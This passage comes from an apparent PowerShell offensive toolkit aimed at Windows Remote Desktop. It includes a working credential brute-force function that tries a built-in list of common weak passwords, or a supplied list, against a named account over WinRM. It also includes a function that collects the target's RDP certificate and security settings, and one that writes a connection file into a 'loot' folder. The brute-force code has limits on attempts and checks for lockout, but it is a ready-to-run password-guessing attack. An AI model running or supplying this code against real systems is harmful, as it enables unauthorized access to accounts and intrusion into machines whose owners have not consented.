            $snapshot = @($script:ARRegistryBackup | Where-Object { $_.KeyPath -eq $keyPath -and $_.Name -eq 'UserAuthentication' })
            if ($snapshot.Count -gt 0) {
                try {
                    Invoke-Command -Session $session -ArgumentList (, $snapshot) -ErrorAction Stop -ScriptBlock {
                        param($entries)
                        foreach ($entry in $entries) {
                            $path = [string]$entry.KeyPath
                            if (-not (Test-Path -LiteralPath $path)) { continue }
                            if (-not $entry.Existed) {
                                Remove-ItemProperty -Path $path -Name ([string]$entry.Name) -Force -ErrorAction SilentlyContinue
                                continue
                            }
                            New-ItemProperty -Path $path -Name ([string]$entry.Name) -Value ([int]$entry.Value) -PropertyType DWord -Force -ErrorAction SilentlyContinue | Out-Null
                        }
                    } | Out-Null
                    Write-ARInfo 'UserAuthentication was replayed after the failed write.'
                }
                catch { Write-ARWarn ('UserAuthentication could not be replayed: ' + $_.Exception.Message) }
            }
        }
    }
}

function Invoke-ARAttackRdpBrute {
    param(
        [string]$UserName = '',
        [string]$PasswordList = '',
        [int]$MaxAttempts = 5,
        [int]$DelaySeconds = 5
    )
    if (-not $script:ARAssumeYes) {
        throw 'RDP password probe refuses to run without -Yes: a rejection loop can lock the account out, so it never starts by accident.'
    }
    $target = Get-ARTargetComputer
    Assert-ARPort -Computer $target -Port 5985 -Purpose 'RDP password probe'
    $session = Get-ARTargetSession
    if ($UserName -eq '') { $UserName = Read-ARValue 'Account to probe' '' }
    if ($UserName -notmatch '^[^\\/:*?"<>|]+$') { throw ('"' + $UserName + '" is not a usable account name.') }
    if ($MaxAttempts -lt 1) { $MaxAttempts = 1 }
    if ($MaxAttempts -gt 20) { $MaxAttempts = 20 }
    if ($DelaySeconds -lt 1) { $DelaySeconds = 1 }
    $candidates = @('Password1', 'P@ssw0rd', 'Welcome1', 'Admin123', 'Welcome123', 'Summer2025', 'Winter2025', 'Changeme1')
    if ($PasswordList -ne '') {
        if (-not (Test-Path -LiteralPath $PasswordList)) { throw ('Password list not found: ' + $PasswordList) }
        $candidates = @(Get-Content -LiteralPath $PasswordList -ErrorAction Stop | ForEach-Object { ([string]$_).Trim() } | Where-Object { $_ -ne '' })
    }
    $candidates = @($candidates | Select-Object -First $MaxAttempts)
    if ($candidates.Count -eq 0) { throw 'The password list is empty; nothing to try.' }
    $domain = [string]$script:ARTarget['Domain']
    $account = $UserName
    if ($domain -ne '' -and $account -notmatch '\\') { $account = $domain + '\' + $account }
    Write-ARWarn ('Probing ' + $UserName + ' with ' + $candidates.Count + ' candidate(s), ' + $DelaySeconds + 's apart. Credentials are checked against the target WinRM endpoint, which shares the account database with RDP.')
    $found = $false
    $attempts = 0
    $lastResult = 'not started'
    foreach ($candidate in $candidates) {
        $state = Invoke-Command -Session $session -ArgumentList $UserName -ErrorAction Stop -ScriptBlock {
            param($name)
            $escaped = $name.Replace("'", "''")
            $account = Get-CimInstance -ClassName Win32_UserAccount -Filter ("Name='" + $escaped + "'") -ErrorAction SilentlyContinue | Select-Object -First 1
            if (-not $account) { return [pscustomobject]@{ Found = $false; Lockout = $false; Disabled = $false } }
            return [pscustomobject]@{ Found = $true; Lockout = [bool]$account.Lockout; Disabled = [bool]$account.Disabled }
        }
        if (-not $state.Found) { throw ('The account ' + $UserName + ' does not exist on ' + $target + '.') }
        if ($state.Lockout) { $lastResult = 'account locked out, probe stopped'; Write-ARWarn 'The account is locked out: nothing else was tried.'; break }
        if ($state.Disabled) { $lastResult = 'account disabled, probe stopped'; Write-ARWarn 'The account is disabled: nothing else was tried.'; break }
        $attempts++
        Write-ARProgress -Activity 'RDP password probe' -Percent ([int](100 * $attempts / $candidates.Count)) -Status ('attempt ' + $attempts + ' of ' + $candidates.Count)
        $secure = ConvertTo-SecureString -String $candidate -AsPlainText -Force
        $credential = New-Object System.Management.Automation.PSCredential($account, $secure)
        $probe = $null
        try {
            $probe = New-PSSession -ComputerName $target -Credential $credential -SessionOption (New-PSSessionOption -OpenTimeout 10000 -OperationTimeout 20000) -ErrorAction Stop
            $found = $true
            $lastResult = 'accepted on attempt ' + $attempts
        }
        catch {
            $lastResult = 'rejected on attempt ' + $attempts
        }
        finally {
            if ($probe) {
                try { Remove-PSSession -Session $probe -ErrorAction SilentlyContinue } catch { }
            }
        }
        if ($found) { break }
        if ($attempts -lt $candidates.Count) { Start-Sleep -Seconds $DelaySeconds }
    }
    if ($found) {
        Write-ARSuccess ('A working password was found for ' + $UserName + ' after ' + $attempts + ' attempt(s).')
        Set-ARStatus 'RDP password probe found a match' 'Ok'
    }
    else {
        Write-ARWarn ('No match after ' + $attempts + ' attempt(s): ' + $lastResult + '.')
        Set-ARStatus 'RDP password probe finished' 'Warn'
    }
    return [pscustomobject]@{
        Id        = '723'
        Action    = 'RdpBrute'
        Target    = $target
        User      = $UserName
        Attempts  = $attempts
        Found     = [bool]$found
        Result    = $lastResult
        Mechanism = 'WinRM credential probe'
    }
}

function Invoke-ARAttackRdpCertificate {
    $target = Get-ARTargetComputer
    Assert-ARPort -Computer $target -Port 5985 -Purpose 'RDP certificate'
    $session = Get-ARTargetSession
    $data = Invoke-Command -Session $session -ErrorAction Stop -ScriptBlock {
        $keyPath = 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp'
        $thumbprint = ''
        try {
            $raw = (Get-ItemProperty -Path $keyPath -Name 'SSLCertificateSHA1Hash' -ErrorAction Stop).SSLCertificateSHA1Hash
            if ($raw) { $thumbprint = (($raw | ForEach-Object { $_.ToString('X2') }) -join '') }
        }
        catch { }
        $certificate = $null
        if ($thumbprint -ne '') {
            try {
                $certificate = Get-ChildItem -Path 'Cert:\LocalMachine\My' -ErrorAction SilentlyContinue |
                    Where-Object { [string]$_.Thumbprint -eq $thumbprint } | Select-Object -First 1
            }
            catch { }
        }
        if (-not $certificate) {
            try {
                $certificate = Get-ChildItem -Path 'Cert:\LocalMachine\Remote Desktop' -ErrorAction SilentlyContinue |
                    Sort-Object NotAfter -Descending | Select-Object -First 1
            }
            catch { }
        }
        $port = 3389
        try { $port = [int](Get-ItemProperty -Path $keyPath -Name 'PortNumber' -ErrorAction Stop).PortNumber } catch { }
        $nla = $null
        try { $nla = [int](Get-ItemProperty -Path $keyPath -Name 'UserAuthentication' -ErrorAction Stop).UserAuthentication } catch { }
        $layer = $null
        try { $layer = [int](Get-ItemProperty -Path $keyPath -Name 'SecurityLayer' -ErrorAction Stop).SecurityLayer } catch { }
        $subject = ''
        $issuer = ''
        $notBefore = $null
        $notAfter = $null
        if ($certificate) {
            $subject = [string]$certificate.Subject
            $issuer = [string]$certificate.Issuer
            $notBefore = $certificate.NotBefore
            $notAfter = $certificate.NotAfter
            if ($thumbprint -eq '') { $thumbprint = [string]$certificate.Thumbprint }
        }
        return [pscustomobject]@{
            Thumbprint  = $thumbprint
            Subject     = $subject
            Issuer      = $issuer
            NotBefore   = $notBefore
            NotAfter    = $notAfter
            Port        = $port
            Nla         = $nla
            SecurityLayer = $layer
        }
    }
    $format = {
        param($value)
        if ($null -eq $value) { return '-' }
        $text = [string]$value
        if ($text -eq '') { return '-' }
        return $text
    }
    $table = @(
        [pscustomobject]@{ Field = 'Thumbprint'; Value = (& $format $data.Thumbprint) }
        [pscustomobject]@{ Field = 'Subject';    Value = (& $format $data.Subject) }
        [pscustomobject]@{ Field = 'Issuer';     Value = (& $format $data.Issuer) }
        [pscustomobject]@{ Field = 'Not before'; Value = (& $format $data.NotBefore) }
        [pscustomobject]@{ Field = 'Not after';  Value = (& $format $data.NotAfter) }
        [pscustomobject]@{ Field = 'Port';       Value = (& $format $data.Port) }
        [pscustomobject]@{ Field = 'NLA';        Value = (& $format $data.Nla) }
        [pscustomobject]@{ Field = 'Security layer'; Value = (& $format $data.SecurityLayer) }
    )
    Show-ARText (($table | Format-Table -AutoSize | Out-String))
    if ($null -ne $data.NotAfter) {
        $days = [int][Math]::Floor(([datetime]$data.NotAfter - (Get-Date)).TotalDays)
        if ($days -lt 0) { Write-ARWarn ('The RDP certificate expired ' + [Math]::Abs($days) + ' day(s) ago.') }
        elseif ($days -lt 30) { Write-ARWarn ('The RDP certificate expires in ' + $days + ' day(s).') }
    }
    Set-ARStatus 'RDP certificate read' 'Ok'
    return [pscustomobject]@{
        Id          = '724'
        Action      = 'RdpCertificate'
        Target      = $target
        Thumbprint  = [string]$data.Thumbprint
        Subject     = [string]$data.Subject
        Issuer      = [string]$data.Issuer
        NotAfter    = $data.NotAfter
        Port        = [int]$data.Port
        Nla         = $data.Nla
        SecurityLayer = $data.SecurityLayer
    }
}

function Invoke-ARAttackRdpFile {
    $target = Get-ARTargetComputer
    Assert-ARPort -Computer $target -Port 5985 -Purpose 'RDP file'
    $session = Get-ARTargetSession
    $settings = Invoke-Command -Session $session -ErrorAction Stop -ScriptBlock {
        $keyPath = 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp'
        $port = 3389
        try { $port = [int](Get-ItemProperty -Path $keyPath -Name 'PortNumber' -ErrorAction Stop).PortNumber } catch { }
        $nla = 1
        try { $nla = [int](Get-ItemProperty -Path $keyPath -Name 'UserAuthentication' -ErrorAction Stop).UserAuthentication } catch { }
        $layer = 2
        try { $layer = [int](Get-ItemProperty -Path $keyPath -Name 'SecurityLayer' -ErrorAction Stop).SecurityLayer } catch { }
        return [pscustomobject]@{ Port = $port; Nla = $nla; SecurityLayer = $layer }
    }
    $port = [int]$settings.Port
    $address = $target
    if ($port -ne 3389) { $address = $target + ':' + [string]$port }
    $authenticationLevel = 2
    if ([int]$settings.Nla -eq 0) { $authenticationLevel = 0 }
    $negotiate = 1
    if ([int]$settings.SecurityLayer -le 0) { $negotiate = 0 }
    $lines = New-Object System.Collections.Generic.List[string]
    $lines.Add('screen mode id:i:2')
    $lines.Add('use multimon:i:1')
    $lines.Add('desktopwidth:i:1920')
    $lines.Add('desktopheight:i:1080')
    $lines.Add('session bpp:i:32')
    $lines.Add('full address:s:' + $address)
    $lines.Add('prompt for credentials:i:0')
    $lines.Add('authentication level:i:' + [string]$authenticationLevel)
    $lines.Add('negotiate security layer:i:' + [string]$negotiate)
    $lines.Add('audiomode:i:0')
    $lines.Add('redirectclipboard:i:1')
    $lines.Add('redirectprinters:i:0')
    $lines.Add('autoreconnection enabled:i:1')
    $lines.Add('bandwidthautodetect:i:1')
    $lines.Add('networkautodetect:i:1')
    $lines.Add('compression:i:1')
    $lines.Add('connection type:i:7')
    $user = [string]$script:ARTarget['User']
    if ($user -ne '') { $lines.Add('username:s:' + $user) }
    $directory = Get-ARLootDirectory 'rdp'
    $safeTarget = $target -replace '[\\/:*?"<>|]', '_'
    $path = Join-Path $directory ('rdp-' + $safeTarget + '-' + (Get-Date -Format 'yyyyMMdd-HHmmss') + '.rdp')
    $encoding = New-Object System.Text.UTF8Encoding($false)
    [System.IO.File]::WriteAllLines($path, $lines.ToArray(), $encoding)
    Write-ARSuccess ('RDP file written to ' + $path)
    Set-ARStatus 'RDP file generated' 'Ok'
    return [pscustomobject]@{
        Id                  = '725'
        Action              = 'RdpFile'
        Target              = $target
        Path                = $path
        Address             = $address
        Port                = $port
        AuthenticationLevel = $authenticationLevel
        NegotiateSecurityLayer = $negotiate
    }
}
